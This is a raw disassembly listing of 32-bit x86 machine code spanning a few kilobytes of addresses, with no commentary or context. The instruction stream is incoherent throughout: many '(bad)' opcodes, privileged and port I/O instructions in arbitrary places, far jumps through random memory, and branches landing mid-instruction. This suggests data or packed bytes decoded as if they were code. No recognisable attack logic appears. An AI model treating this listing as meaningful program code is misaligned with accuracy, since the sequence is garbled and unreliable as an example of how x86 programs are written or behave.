  4369c0:	(bad)  
  4369c1:	(bad)  
  4369c2:	(bad)  
  4369c3:	jmp    FWORD PTR [ebp-0x491100e6]
  4369c9:	inc    DWORD PTR [ebx-0x4d00bc3d]
  4369cf:	jb     0x4369d1
  4369d1:	add    bh,bh
  4369d3:	int3   
  4369d4:	ret    0xc4
  4369d7:	mov    bh,0x69
  4369d9:	inc    DWORD PTR [eax]
  4369db:	rol    BYTE PTR ss:[eax],1
  4369de:	outs   dx,BYTE PTR ds:[esi]
  4369df:	(bad)  
  4369e0:	mov    esp,ecx
  4369e2:	cmp    edi,0x5d
  4369e5:	inc    BYTE PTR [ebx-0x7c1257]
  4369eb:	push   0x365000d4
  4369f0:	add    bh,bh
  4369f2:	(bad)  
  4369f3:	jmp    FWORD PTR [ebx-0x60]
  4369f6:	add    BYTE PTR [esi+0x34],dh
  4369f9:	add    DWORD PTR [ebx-0x46000cdf],0xfffffff0
  436a00:	add    BYTE PTR [eax],al
  436a02:	inc    DWORD PTR [eax]
  436a04:	ds dec edi
  436a06:	mov    DWORD PTR [ebp-0x657c00aa],eax
  436a0c:	(bad)  
  436a0e:	data16 jle 0x436a10
  436a11:	(bad)  
  436a12:	inc    DWORD PTR [eax]
  436a14:	popa   
  436a15:	jnp    0x4369a0
  436a17:	mov    edx,0xe2ff8300
  436a1c:	mov    cs,esp
  436a1e:	fadd   st(1),st
  436a20:	add    bh,bh
  436a22:	(bad)  
  436a23:	call   FWORD PTR [ecx+0x74]
  436a26:	jmp    DWORD PTR [esi+0x26ffffe5]
  436a2c:	mov    dh,0x0
  436a2e:	mov    eax,0xfffffff8
  436a33:	call   FWORD PTR [edx-0x1e7f0074]
  436a39:	inc    DWORD PTR [ebx-0x6b00be4f]
  436a3f:	add    eax,0xff00ffff
  436a44:	inc    esi
  436a45:	mov    ds:0xff43b000,eax
  436a4a:	(bad)  
  436a4b:	sti    
  436a4c:	adc    bh,bh
  436a4e:	sbb    al,BYTE PTR [ebp-0x7c0001]
  436a54:	div    al
  436a56:	add    BYTE PTR [edx+ecx*1+0x0],bh
  436a5a:	int3   
  436a5b:	dec    edx
  436a5c:	cmp    edi,0xffffffb4
  436a5f:	outs   dx,BYTE PTR ds:[esi]
  436a60:	or     DWORD PTR [ecx-0x61240001],0xffffff89
  436a67:	mov    ebp,0x25ff00b0
  436a6c:	push   ebp
  436a6d:	add    BYTE PTR [edx],dl
  436a6f:	jno    0x436a71
  436a71:	cmp    edi,0xffffffff
  436a74:	aad    0xa4
  436a76:	call   FWORD PTR [esi-0x4b]
  436a79:	(bad)  
  436a7a:	call   ebp
  436a7c:	add    eax,DWORD PTR [eax]
  436a7e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  436a7f:	add    al,BYTE PTR [eax]
  436a81:	inc    DWORD PTR [ebx-0xbe7c77]
  436a87:	mov    ebp,0x310000bf
  436a8c:	inc    esp
  436a8d:	push   DWORD PTR [edx]
  436a8f:	and    edi,edi
  436a91:	(bad)  
  436a92:	inc    DWORD PTR [eax]
  436a94:	mov    bl,0xc
  436a96:	call   FWORD PTR [ecx]
  436a98:	and    eax,0x224ff00
  436a9d:	add    BYTE PTR ds:0xff000098,ah
  436aa3:	jmp    FWORD PTR [eax-0x322a7633]
  436aa9:	dec    DWORD PTR [ecx-0x647ccc60]
  436aaf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  436ab0:	int3   
  436ab1:	inc    DWORD PTR [eax]
  436ab3:	call   DWORD PTR [ecx+0x30]
  436ab6:	mov    DWORD PTR [ebx+eax*4],ecx
  436ab9:	mov    esp,ecx
  436abb:	jo     0x436a88
  436abd:	and    DWORD PTR ds:0xcd,0xffffff89
  436ac4:	pop    es
  436ac5:	cmp    BYTE PTR [ebx-0x76f00c],al
  436acb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  436acc:	out    dx,eax
  436acd:	add    dh,dl
  436acf:	xor    al,0xcc
  436ad1:	(bad)  
  436ad2:	inc    DWORD PTR [ebx-0x20ff83ea]
  436ad8:	add    BYTE PTR ds:[ebx+0x44ff936a],al
  436adf:	adc    BYTE PTR [ebx+0x42ffff00],al
  436ae5:	lahf   
  436ae6:	call   eax
  436ae8:	stos   BYTE PTR es:[edi],al
  436ae9:	add    bh,bh
  436aeb:	mov    ss,WORD PTR [esi-0x7d]
  436aee:	dec    esi
  436aef:	loop   0x436af0
  436af1:	inc    DWORD PTR [eax]
  436af3:	mov    esi,ebx
  436af5:	lahf   
  436af6:	call   FWORD PTR [esi]
  436af8:	sub    BYTE PTR [eax],al
  436afa:	add    cl,bl
  436afc:	std    
  436afd:	inc    DWORD PTR [eax+0x6e]
  436b00:	(bad)  
  436b01:	(bad)  
  436b02:	inc    DWORD PTR [eax]
  436b04:	pop    edx
  436b05:	push   0x0
  436b07:	in     eax,0xe1
  436b09:	add    BYTE PTR [eax],al
  436b0b:	imul   eax,DWORD PTR [ecx],0xffffffcc
  436b0e:	adc    al,0x5c
  436b10:	cmp    edi,0xffffffff
  436b13:	xor    DWORD PTR [ecx+0x7f],0xffffffff
  436b17:	jmp    0x436b61
  436b19:	(bad)  
  436b1a:	push   eax
  436b1c:	(bad)  
  436b1d:	call   FWORD PTR [ebx+0x838361]
  436b23:	jmp    DWORD PTR [edi]
  436b25:	(bad)  
  436b26:	dec    DWORD PTR [edi+0x62]
  436b29:	(bad)  
  436b2a:	push   DWORD PTR [eax]
  436b2c:	add    eax,0xffe280ff
  436b31:	cmp    edi,0xffffffff
  436b34:	push   edx
  436b35:	cli    
  436b36:	add    al,cl
  436b38:	mov    ds:0x7b38ff00,eax
  436b3d:	push   DWORD PTR [ebp+0x78]
  436b40:	int3   
  436b41:	dec    esp
  436b43:	xor    DWORD PTR [ebx*4+0xb381ff],0xffffff83
  436b4b:	cwde   
  436b4c:	out    0xff,eax
  436b4e:	pop    eax
  436b4f:	imul   eax,DWORD PTR [eax],0x9700ff00
  436b55:	add    al,BYTE PTR [ebx-0x76b9eb]
  436b5b:	in     eax,0x9a
  436b5d:	add    cl,bh
  436b5f:	inc    eax
  436b60:	add    DWORD PTR [eax],0x0
  436b63:	add    BYTE PTR [eax],al
  436b65:	add    edi,edi
  436b67:	sbb    DWORD PTR [ebx-0x1],edi
  436b6a:	add    bl,cl
  436b6c:	imul   eax,DWORD PTR [ebx-0x9d06],0x0
  436b73:	jmp    DWORD PTR [ecx]
  436b75:	pop    ebx
  436b76:	push   DWORD PTR [ebx+eiz*1-0x1]
  436b7a:	int3   
  436b7b:	in     al,0x59
  436b7d:	dec    DWORD PTR [edx]
  436b7f:	popa   
  436b80:	add    BYTE PTR [ebx-0x264dff34],al
  436b86:	add    BYTE PTR [edx-0x67],ah
  436b89:	(bad)  
  436b8a:	inc    DWORD PTR [ecx+ecx*2-0x7d]
  436b8e:	stos   BYTE PTR es:[edi],al
  436b8f:	pop    edx
  436b90:	inc    DWORD PTR [eax]
  436b92:	cmp    edi,0xffffff8b
  436b95:	push   ebp
  436b96:	push   DWORD PTR [edx+edi*1]
  436b99:	add    BYTE PTR [eax],al
  436b9b:	pop    ecx
  436b9c:	and    edi,edi
  436b9e:	dec    eax
  436b9f:	sub    cl,BYTE PTR [ecx+0x1000ffff]
  436ba5:	xor    edi,edi
  436ba7:	ror    BYTE PTR [ecx-0x1],1
  436baa:	adc    eax,0x1b
  436bad:	push   DWORD PTR [ebx+0x1c]
  436bb0:	int3   
  436bb1:	int3   
  436bb2:	add    BYTE PTR [ebx-0x307cd62b],al
  436bb8:	hlt    
  436bb9:	add    bh,bh
  436bbb:	mov    cl,0x1f
  436bbd:	add    BYTE PTR [edi],ch
  436bbf:	jbe    0x436b44
  436bc1:	(bad)  
  436bc2:	(bad)  
  436bc3:	jmp    ebx
  436bc5:	xchg   esp,eax
  436bc6:	int3   
  436bc7:	pop    edi
  436bc8:	or     edi,edi
  436bca:	add    BYTE PTR [eax-0x10],al
  436bcd:	(bad)  
  436bce:	jp     0x436be6
  436bd0:	add    bh,bh
  436bd2:	(bad)  
  436bd3:	call   FWORD PTR [ebp+0x33dafffd]
  436bd9:	add    ah,cl
  436bdb:	lea    ebx,[ecx+0xbfcf83]
  436be1:	add    bh,bh
  436be3:	add    BYTE PTR [esi-0x78],bl
  436be6:	or     DWORD PTR [eax],0x26
  436be9:	(bad)  
  436bea:	inc    esi
  436bec:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  436bed:	cmp    DWORD PTR [edi+0xcccce0],0xffffffff
  436bf4:	pushf  
  436bf5:	cmp    edi,edi
  436bf7:	cwde   
  436bf8:	test   eax,0xc547cc83
  436bfd:	int3   
  436bfe:	ss pop ds
  436c00:	(bad)  
  436c01:	dec    DWORD PTR [ecx-0xf1437d]
  436c07:	push   edx
  436c08:	rol    DWORD PTR [eax],1
  436c0a:	call   FWORD PTR [edx]
  436c0c:	jge    0x436bda
  436c0e:	(bad)  
  436c0f:	mov    bh,0xff
  436c11:	add    BYTE PTR [eax],al
  436c13:	int3   
  436c14:	cmp    DWORD PTR [esi-0x76a3ec34],ebp
  436c1a:	call   DWORD PTR [esi-0x29]
  436c1d:	add    BYTE PTR [ebx-0x5f],bh
  436c20:	inc    DWORD PTR [ebx+0x716d0000]
  436c26:	cmp    DWORD PTR [esi-0x4733008f],0xffffffcc
  436c2d:	add    BYTE PTR [eax],al
  436c2f:	dec    eax
  436c30:	or     esp,0xffffffff
  436c33:	add    ch,ah
  436c35:	cmp    BYTE PTR [eax],al
  436c37:	pop    ds
  436c38:	and    cl,BYTE PTR [ecx-0xd4c900]
  436c3e:	cmp    DWORD PTR [edx],eax
  436c40:	add    DWORD PTR [eax],0xffffffff
  436c43:	call   DWORD PTR [ecx+0x55d3cc2b]
  436c49:	mov    DWORD PTR [ebx+0x42ffda15],eax
  436c4f:	xor    al,0xff
  436c51:	add    ah,cl
  436c53:	call   DWORD PTR [ebp-0x4cceffec]
  436c59:	add    bh,bh
  436c5b:	sti    
  436c5c:	jb     0x436be1
  436c5e:	mov    BYTE PTR ds:0xccff83ff,bl
  436c64:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  436c65:	idiv   edi
  436c67:	jle    0x436bea
  436c69:	add    bh,bh
  436c6b:	pop    ds
  436c6c:	pop    esp
  436c6d:	add    BYTE PTR [ebp+0x2a],bl
  436c70:	(bad)  
  436c71:	inc    DWORD PTR [eax]
  436c73:	dec    DWORD PTR [esi+ebx*8-0x7ccd7501]
  436c7a:	int3   
  436c7b:	add    esp,DWORD PTR [edi-0x584f34]
  436c81:	(bad)  
  436c82:	inc    DWORD PTR [eax]
  436c84:	ja     0x436cea
  436c86:	add    BYTE PTR [ecx-0x54],dh
  436c89:	mov    DWORD PTR [eax],eax
  436c8b:	imul   ebp,DWORD PTR [edx],0x8972e7ff
  436c91:	inc    DWORD PTR [ebx+0x5980ff]
  436c97:	cmp    al,0xa2
  436c99:	(bad)  
  436c9a:	push   DWORD PTR [esi]
  436c9c:	xchg   bh,bh
  436c9e:	fmul   QWORD PTR [ecx]
  436ca0:	inc    DWORD PTR [eax]
  436ca2:	add    bh,bh
  436ca4:	or     edx,DWORD PTR [edi-0x33e08301]
  436caa:	add    dl,ah
  436cac:	sbb    al,0x89
  436cae:	sub    eax,0xccff8933
  436cb3:	int3   
  436cb4:	dec    eax
  436cb5:	cli    
  436cb6:	push   ebx
  436cb8:	retf   
  436cb9:	add    BYTE PTR [ebx-0x16763769],al
  436cbf:	ud0    edi,edi
  436cc2:	inc    DWORD PTR [eax]
  436cc4:	int    0x1a
  436cc6:	sbb    esi,0x29
  436cc9:	add    bh,bh
  436ccb:	test   BYTE PTR [edx-0x7c6e0e01],al
  436cd1:	(bad)  
  436cd2:	inc    DWORD PTR [eax]
  436cd4:	retf   
  436cd5:	pop    ebx
  436cd6:	call   ebp
  436cd8:	arpl   di,di
  436cda:	jmp    ecx
  436cdc:	out    0x0,al
  436cde:	cs loop 0x436ce1
  436ce1:	dec    DWORD PTR [ecx+0x27c8ff]
  436ce7:	dec    ecx
  436ce8:	pop    esp
  436ce9:	inc    DWORD PTR [ebx-0xb00a3c9]
  436cef:	les    ecx,FWORD PTR [ecx-0x46760001]
  436cf5:	data16 (bad) 
  436cf7:	jns    0x436c95
  436cf9:	add    BYTE PTR [ebx+0x1700c97f],al
  436cff:	sub    BYTE PTR [ecx-0x51ffff01],cl
  436d05:	hlt    
  436d06:	add    BYTE PTR [ebx+edx*1],bl
  436d09:	inc    DWORD PTR [eax]
  436d0b:	pop    esp
  436d0c:	fs int3 
  436d0e:	jl     0x436d8c
  436d10:	(bad)  
  436d11:	inc    DWORD PTR [eax]
  436d13:	int3   
  436d14:	bnd jo 0x436d16
  436d17:	outs   dx,BYTE PTR ds:[esi]
  436d18:	loop   0x436ce6
  436d1a:	push   DWORD PTR [esi-0x7aaa00ef]
  436d20:	int3   
  436d21:	cmp    edi,0xffffffff
  436d24:	daa    
  436d25:	sbb    al,BYTE PTR [eax]
  436d27:	in     eax,0xc3
  436d29:	add    DWORD PTR [eax],0xffffff8f
  436d2c:	clc    
  436d2d:	inc    DWORD PTR [ecx-0x7c7c3b]
  436d33:	(bad)  
  436d34:	cmp    DWORD PTR [ebx],esi
  436d36:	or     DWORD PTR [ecx+0x628300c0],0xffffffb3
  436d3d:	add    dh,dh
  436d3f:	mov    cl,0xff
  436d41:	inc    DWORD PTR [eax]
  436d43:	cmp    DWORD PTR [ebx-0x2a],0xffffffcc
  436d47:	dec    edx
  436d48:	push   ebp
  436d49:	inc    DWORD PTR [eax]
  436d4b:	mov    al,ds:0x8ed4ffba
  436d50:	add    BYTE PTR [ebx+0x4f5300ff],al
  436d56:	add    BYTE PTR [esi-0xbffffca],ah
  436d5c:	dec    ebx
  436d5d:	add    ah,cl
  436d5f:	test   BYTE PTR [eax],al
  436d61:	inc    DWORD PTR [eax]
  436d63:	or     ebx,0x1f
  436d66:	and    DWORD PTR [ecx-0x48000076],0xffffffca
  436d6d:	dec    DWORD PTR [ecx-0x58]
  436d70:	add    BYTE PTR [ebx+0x7dabcc00],al
  436d76:	int3   
  436d77:	ret    
  436d78:	out    0xcc,al
  436d7a:	add    BYTE PTR [ebp-0x74],al
  436d7d:	int3   
  436d7e:	inc    ebp
  436d7f:	jle    0x436d80
  436d81:	(bad)  
  436d82:	inc    DWORD PTR [eax]
  436d84:	mov    dl,0x12
  436d86:	sub    DWORD PTR [ecx+0x4a],0x0
  436d8a:	dec    esp
  436d8c:	dec    ebp
  436d8d:	add    BYTE PTR [eax-0xff0078],dl
  436d93:	(bad)  
  436d94:	in     eax,dx
  436d95:	mov    cl,0xff
  436d97:	sub    dh,BYTE PTR ds:0x29500ff
  436d9d:	dec    DWORD PTR [edi-0x54]
  436da0:	inc    DWORD PTR [eax]
  436da2:	add    bh,bh
  436da4:	adc    ebx,DWORD PTR [edx]
  436da6:	(bad)  
  436da7:	jp     0x436da9
  436da9:	mov    DWORD PTR [eax],eax
  436dab:	(bad)  
  436dac:	adc    BYTE PTR [ebx-0x331e6d],al
  436db2:	int3   
  436db3:	add    DWORD PTR [esi-0x69],0x0
  436db7:	push   es
  436db8:	sbb    cl,ah
  436dba:	add    BYTE PTR [ebp-0x7fad002b],ch
  436dc0:	(bad)  
  436dc1:	inc    DWORD PTR [eax]
  436dc3:	add    BYTE PTR [edx-0x518533be],dl
  436dc9:	inc    DWORD PTR [eax]
  436dcb:	cmp    esi,eax
  436dcd:	add    BYTE PTR [ecx],dh
  436dcf:	addr16 (bad) 
  436dd1:	inc    DWORD PTR [eax]
  436dd3:	int3   
  436dd4:	sub    ecx,DWORD PTR [edx]
  436dd6:	call   FWORD PTR [ebx-0x7d7c00e0]
  436ddc:	lods   eax,DWORD PTR ds:[esi]
  436ddd:	add    BYTE PTR [edx+ebx*8+0x0],dh
  436de1:	add    bh,bh
  436de3:	sbb    DWORD PTR [ebp-0x784c0085],0xffffffff
  436dea:	dec    DWORD PTR ds:0x970ccc33
  436df0:	dec    DWORD PTR [ecx+0x24b30000]
  436df6:	(bad)  
  436df7:	cmp    edx,DWORD PTR [eax+0x6bb800cc]
  436dfd:	dec    esi
  436dff:	mov    ?,edi
  436e01:	mov    DWORD PTR [eax],eax
  436e03:	call   ebx
  436e05:	loope  0x436e06
  436e07:	adc    edx,eax
  436e09:	add    bh,bh
  436e0b:	push   ebp
  436e0c:	enter  0x80cc,0x7b
  436e10:	add    bh,bh
  436e12:	cmp    edi,0x6b
  436e15:	push   ebp
  436e16:	jmp    DWORD PTR [edi]
  436e18:	data16 add BYTE PTR [eax],al
  436e1b:	pop    esp
  436e1c:	ins    BYTE PTR es:[edi],dx
  436e1d:	int3   
  436e1e:	ss cwde 
  436e20:	inc    DWORD PTR [eax]
  436e22:	add    BYTE PTR [eax],al
  436e24:	mov    cl,0xaa
  436e26:	inc    DWORD PTR [ecx-0x71]
  436e29:	(bad)  
  436e2a:	push   ebp
  436e2c:	add    ah,cl
  436e2e:	pop    ebp
  436e2f:	jmp    0xcc436e34
  436e34:	or     BYTE PTR [ebp+0x0],al
  436e37:	(bad)  
  436e38:	sar    bh,cl
  436e3a:	push   DWORD PTR [ecx+0x4d1300c4]
  436e40:	add    BYTE PTR [eax],al
  436e42:	int3   
  436e43:	mov    DWORD PTR [ecx-0x42],edx
  436e46:	(bad)  
  436e47:	cmp    esp,ebx
  436e49:	mov    edi,edi
  436e4b:	xor    edi,DWORD PTR [ecx]
  436e4d:	int3   
  436e4e:	test   al,0xb3
  436e50:	cmp    edi,0x0
  436e53:	cmp    DWORD PTR [ebx],0x3f
  436e56:	add    BYTE PTR [eax+edx*1],dh
  436e59:	add    DWORD PTR [eax],0x41
  436e5c:	out    0xcc,al
  436e5e:	add    DWORD PTR [esi-0x77],ebp
  436e61:	dec    DWORD PTR [ecx-0xd8fd00]
  436e67:	mov    edx,DWORD PTR [edi]
  436e69:	add    BYTE PTR [eax],al
  436e6b:	dec    esi
  436e6c:	stos   DWORD PTR es:[edi],eax
  436e6d:	jmp    FWORD PTR [ebx]
  436e6f:	inc    edi
  436e70:	(bad)  
  436e71:	(bad)  
  436e72:	(bad)  
  436e73:	push   DWORD PTR [edx+0x52a8ff67]
  436e79:	add    BYTE PTR [ebx-0x2b00a021],al
  436e7f:	sbb    bh,bh
  436e81:	add    bh,bh
  436e83:	add    BYTE PTR [ebx+0x46],bl
  436e86:	push   esp
  436e88:	push   esi
  436e89:	int3   
  436e8a:	add    BYTE PTR [eax],cl
  436e8c:	mov    ds:0xff37b2ff,eax
  436e91:	(bad)  
  436e92:	inc    DWORD PTR [eax]
  436e94:	jmp    0xcc00:0x80f3ffb4
  436e9b:	fisttp DWORD PTR [esi]
  436e9d:	push   ebp
  436e9f:	and    BYTE PTR [eax],al
  436ea1:	(bad)  
  436ea2:	inc    DWORD PTR [eax]
  436ea4:	sbb    eax,0xbe1dffe6
  436ea9:	add    bh,bh
  436eab:	ins    DWORD PTR es:[edi],dx
  436eac:	dec    eax
  436ead:	sub    DWORD PTR [edi],0x3d
  436eb0:	(bad)  
  436eb1:	(bad)  
  436eb2:	inc    DWORD PTR [eax]
  436eb4:	cmp    al,BYTE PTR [esi-0x126101]
  436eba:	and    edi,0x78
  436ebd:	inc    DWORD PTR [ecx-0xffffe0]
  436ec3:	call   FWORD PTR [esp+eiz*8+0x0]
  436ec7:	in     eax,dx
  436ec8:	(bad)  
  436ecb:	mov    esi,0x751a001b
  436ed0:	cmp    edi,0xffffffff
  436ed3:	inc    DWORD PTR [ecx-0x761d00d0]
  436ed9:	add    BYTE PTR [ecx+0x62ffe345],cl
  436edf:	pop    esp
  436ee0:	add    ah,cl
  436ee2:	cmp    edi,0xffffffb3
  436ee5:	jne    0x436ee6
  436ee7:	imul   eax,ebx,0x78740000
  436eed:	int3   
  436eee:	pop    ss
  436eef:	xchg   ebp,eax
  436ef0:	cmp    edi,0xffffffff
  436ef3:	add    BYTE PTR [ebx-0x8],al
  436ef6:	(bad)  
  436ef7:	fbld   TBYTE PTR [eax+0x2e5800cc]
  436efd:	add    BYTE PTR [edx+0x4d],dl
  436f00:	or     esp,0xffffff83
  436f03:	call   DWORD PTR [esi+0x9d9ffd2]
  436f09:	dec    esp
  436f0b:	mov    dh,0x4d
  436f0d:	mov    DWORD PTR [ecx+0x52],esi
  436f10:	inc    DWORD PTR [ebx+0x21b5ff83]
  436f16:	inc    DWORD PTR [esi+edi*4]
  436f19:	add    bh,bh
  436f1b:	rcl    BYTE PTR [edi],0x0
  436f1e:	sbb    DWORD PTR [ebx],0xffffffff
  436f21:	or     esp,0xffffffff
  436f24:	cmp    ebp,esi
  436f26:	add    BYTE PTR [eax],cl
  436f28:	fiadd  WORD PTR [eax]
  436f2a:	mov    DWORD PTR [esi],edi
  436f2c:	test   edi,edi
  436f2e:	jl     0x436edf
  436f30:	(bad)  
  436f31:	(bad)  
  436f32:	(bad)  
  436f33:	push   DWORD PTR [ebx+0x63]
  436f36:	add    bh,ah
  436f38:	dec    ecx
  436f39:	add    ah,cl
  436f3b:	and    al,0xf1
  436f3d:	jmp    DWORD PTR [ecx-0x337c18]
  436f43:	mov    DWORD PTR [ebp-0x6a980095],esp
  436f49:	add    BYTE PTR [eax],al
  436f4b:	xchg   DWORD PTR [edx],ecx
  436f4d:	jmp    FWORD PTR [ecx+eax*4-0x77]
  436f51:	mov    edi,edi
  436f53:	int3   
  436f54:	call   0x82576ed3
  436f59:	add    BYTE PTR [eax],al
  436f5b:	push   ebx
  436f5c:	xor    al,0x83
  436f5e:	dec    ecx
  436f5f:	sti    
  436f60:	cmp    edi,0xffffffff
  436f63:	jmp    FWORD PTR [esi+ecx*8-0x302100]
  436f6a:	(bad)  
  436f6b:	clc    
  436f6c:	jl     0x436f6d
  436f6e:	xchg   esi,eax
  436f6f:	enter  0xff,0xff
  436f73:	jmp    FWORD PTR [edx]
  436f75:	out    0x0,eax
  436f77:	inc    edi
  436f78:	mov    dh,0xff
  436f7a:	add    BYTE PTR [eax-0x56],dh
  436f7d:	xor    DWORD PTR [esp+eax*4],0xffffff89
  436f81:	add    bh,bh
  436f83:	push   esi
  436f85:	mov    ?,edi
  436f87:	or     esi,eax
  436f89:	(bad)  
  436f8a:	inc    DWORD PTR [eax+0x64bffe3]
  436f90:	add    DWORD PTR [eax],0xffffff89
  436f93:	add    BYTE PTR ds:0x459affbc,dl
  436f99:	add    bh,bh
  436f9b:	dec    ebp
  436f9c:	mov    bl,0x83
  436f9e:	pop    edx
  436f9f:	aas    
  436fa0:	(bad)  
  436fa1:	inc    DWORD PTR [eax]
  436fa3:	add    BYTE PTR [ebx+eax*4+0x1ab000],al
  436faa:	add    BYTE PTR [ebx+0x29],dh
  436fad:	push   edx
  436faf:	repnz add BYTE PTR [eax],al
  436fb2:	inc    DWORD PTR [eax]
  436fb4:	pop    ds
  436fb5:	jge    0x436f83
  436fb7:	adc    DWORD PTR [ebp-0xeffff01],ecx
  436fbd:	jmp    FWORD PTR [eax+0x83ff40]
  436fc3:	dec    DWORD PTR [esi-0xf]
  436fc6:	add    BYTE PTR [eax],bl
  436fc8:	mov    cl,0x0
  436fca:	dec    DWORD PTR [ebx+0x789aff4a]
  436fd0:	cmp    edi,0xffffffff
  436fd3:	int3   
  436fd4:	out    dx,eax
  436fd5:	(bad)  
  436fd6:	call   FWORD PTR [esp+edi*4]
  436fd9:	(bad)  
  436fda:	push   DWORD PTR [esi+esi*4-0x36234]
  436fe1:	(bad)  
  436fe2:	inc    DWORD PTR [ebx-0x29ff21b4]
  436fe8:	mov    ecx,0x47f2cc89
  436fed:	cmp    DWORD PTR [eax-0x41],0x0
  436ff1:	add    bh,bh
  436ff3:	or     DWORD PTR [edx],0xffffffc2
  436ff6:	jmp    esp
  436ff8:	repnz int3 
  436ffa:	add    BYTE PTR [ebp+0x5c],dl
  436ffd:	and    eax,0x4b
  437000:	add    BYTE PTR [ebx-0x8400100],al
  437006:	inc    DWORD PTR [ebx]
  437008:	adc    edi,edi
  43700a:	add    BYTE PTR [ecx],bl
  43700c:	ja     0x43700d
  43700e:	ret    
  43700f:	fld    DWORD PTR [ebx+0x288300ff]
  437015:	hlt    
  437016:	(bad)  
  437017:	in     al,dx
  437018:	xchg   edi,eax
  437019:	add    DWORD PTR [ebx-0x62330d80],0x3
  437020:	inc    DWORD PTR [eax]
  437022:	add    bh,bh
  437024:	sub    ch,BYTE PTR [eax]
  437026:	xor    DWORD PTR [edx+0x7e],0x0
  43702a:	call   FWORD PTR [ebp-0x6e]
  43702d:	int3   
  43702e:	xchg   ecx,eax
  43702f:	dec    esi
  437030:	add    BYTE PTR [eax],al
  437032:	dec    DWORD PTR [ecx+0x22ff4c12]
  437038:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  437039:	(bad)  
  43703a:	(bad)  
  43703b:	in     al,dx
  43703c:	aad    0x0
  43703e:	cmp    esi,edi
  437040:	inc    DWORD PTR [eax]
  437042:	(bad)  
  437043:	push   DWORD PTR [eax+0x44f80061]
  437049:	inc    DWORD PTR [eax]
  43704b:	add    BYTE PTR [esp+ecx*8-0x76005861],cl
  437052:	(bad)  
  437053:	inc    DWORD PTR [edi]
  437055:	sub    eax,0xfffa2c00
  43705a:	add    BYTE PTR [esi+0xa],bl
  43705d:	add    BYTE PTR [ebp+0x5a],dh
  437060:	(bad)  
  437061:	dec    esp
  437063:	add    BYTE PTR [esi+0x71d483df],ch
  437069:	add    DWORD PTR [eax],0x53
  43706c:	rol    DWORD PTR [eax],0x87
  43706f:	fild   DWORD PTR [eax]
  437071:	(bad)  
  437072:	inc    DWORD PTR [eax]
  437074:	jge    0x4370e7
  437076:	(bad)  
  437077:	stc    
  437078:	jecxz  0x437079
  43707a:	mov    DWORD PTR [ecx],edx
  43707c:	mov    al,0x89
  43707e:	push   ss
  43707f:	mov    esi,0x83ffcc00
  437084:	pop    ebp
  437085:	lea    eax,[eax]
  437087:	mov    dh,dh
  437089:	inc    DWORD PTR [eax]
  43708b:	and    al,0xd7
  43708d:	int3   
  43708e:	test   BYTE PTR [ebx+eax*4],dh
  437091:	mov    DWORD PTR [eax],eax
  437093:	add    edx,0x69
  437096:	add    BYTE PTR [ebp+ebx*8-0x6bc7ff01],cl
  43709d:	push   ebp
  43709f:	pop    eax
  4370a0:	int3   
  4370a1:	dec    DWORD PTR [ecx+0xc65700]
  4370a7:	push   ds
  4370a8:	mov    dh,0xff
  4370aa:	sbb    ebx,0x23
  4370ad:	call   FWORD PTR [ebp-0x64]
  4370b0:	add    BYTE PTR [eax],al
  4370b2:	inc    DWORD PTR [eax]
  4370b4:	xchg   BYTE PTR [ecx-0xb96601],ch
  4370ba:	mov    edi,esp
  4370bc:	cmc    
  4370bd:	(bad)  
  4370be:	cmp    esi,DWORD PTR ds:0xff8900cc
  4370c4:	outs   dx,BYTE PTR ds:[esi]
  4370c5:	push   cs
  4370c6:	jmp    FWORD PTR [ebp-0x5fff33d8]
  4370cc:	(bad)  
  4370cd:	int3   
  4370ce:	scas   eax,DWORD PTR es:[edi]
  4370cf:	aas    
  4370d0:	mov    edi,edi
  4370d2:	add    BYTE PTR [eax],al
  4370d4:	outs   dx,BYTE PTR ds:[esi]
  4370d5:	pop    es
  4370d6:	jmp    FWORD PTR [ebp-0x6b]
  4370d9:	(bad)  
  4370da:	call   FWORD PTR [ebp+0x41ac0057]
  4370e0:	add    bh,bh
  4370e2:	(bad)  
  4370e3:	inc    DWORD PTR [eax+0x3c]
  4370e6:	add    BYTE PTR [edi+0x25ffff61],bl
  4370ec:	add    BYTE PTR ss:[ebx+ebp*2-0x1],ah
  4370f1:	add    bh,bh
  4370f3:	(bad)  
  4370f4:	jmp    0x437119
  4370f6:	call   FWORD PTR [edi+0x32cc001b]
  4370fc:	les    eax,FWORD PTR [eax]
  4370fe:	jnp    0x4370bf
  437100:	add    BYTE PTR [ebx-0x5808ff01],al
  437106:	dec    eax
  437108:	call   0x5fbd710c
  43710d:	jmp    esp
  43710f:	xor    bh,bh
  437111:	dec    DWORD PTR [ecx+0x702b89]
  437117:	loop   0x437185
  437119:	add    bh,bh
  43711b:	inc    ebp
  43711c:	xchg   esi,eax
  43711d:	call   FWORD PTR [eax]
  43711f:	or     DWORD PTR [ecx+0x1bff0000],0xfffffff1
  437126:	inc    DWORD PTR [ebp+0xa]
  437129:	inc    DWORD PTR [eax]
  43712b:	xor    eax,0x594200d1
  437130:	(bad)  
  437131:	(bad)  
  437132:	inc    DWORD PTR [eax]
  437134:	rcr    DWORD PTR [ecx-0x2d9e01],cl
  43713a:	add    BYTE PTR [esi-0x46],bh
  43713d:	and    DWORD PTR [ebx+0x45],0xffffffff
  437141:	inc    DWORD PTR [eax]
  437143:	(bad)  
  437144:	cmp    DWORD PTR [eax-0x6d8400],eax
  43714a:	add    BYTE PTR [esi-0x31],cl
  43714d:	inc    ecx
  43714f:	ret    0xffff
  437152:	add    BYTE PTR [ecx-0x4d00a9a1],cl
  437158:	jne    0x43715a
  43715a:	add    BYTE PTR [ebp-0x48],ch
  43715d:	int3   
  43715e:	jg     0x43716b
  437160:	(bad)  
  437161:	(bad)  
  437162:	dec    DWORD PTR [ecx-0x50009b14]
  437168:	jmp    0x437169
  43716a:	int3   
  43716b:	cs jns 0xffc6dbd6
  437172:	inc    DWORD PTR [ebx-0x747ca16f]
  437178:	fld    QWORD PTR [ebx-0x7c5c0f00]
  43717e:	mov    ch,0x94
  437180:	add    BYTE PTR [ecx-0x79e60001],cl
  437186:	add    BYTE PTR [ebx-0x1],bh
  437189:	(bad)  
  43718a:	push   ecx
  43718c:	ror    DWORD PTR [ecx+0x89b8cc],cl
  437192:	mov    ecx,0xa31d8995
  437197:	xchg   bh,bh
  437199:	add    BYTE PTR [esi],bl
